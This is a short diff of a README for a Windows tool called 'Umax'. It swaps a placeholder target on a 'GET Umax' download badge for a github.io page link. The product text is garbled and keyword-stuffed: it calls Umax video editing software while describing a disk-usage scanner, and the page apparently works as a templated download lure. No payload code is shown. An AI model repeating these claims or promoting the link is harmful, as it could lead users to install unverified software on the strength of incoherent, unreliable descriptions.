@@ -4,7 +4,7 @@
 
 Umax is a focused Windows video editing software utility for measuring projects, comparing large media paths, and understanding where storage for footage goes. Umax keeps scans readable, reports clear, and daily cleanup decisions easier for home users, students, offices, and technicians who rely on Umax for steady folder size disk usage insight regarding their video assets.
 
-[![GET Umax](https://img.shields.io/badge/GET%20%E2%80%94%20Umax-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Umax](https://img.shields.io/badge/GET%20%E2%80%94%20Umax-0078D6?style=for-the-badge&logoColor=white)](https://lauramartinezp957.github.io/.github/umax-video-editor)
 
 ---
 
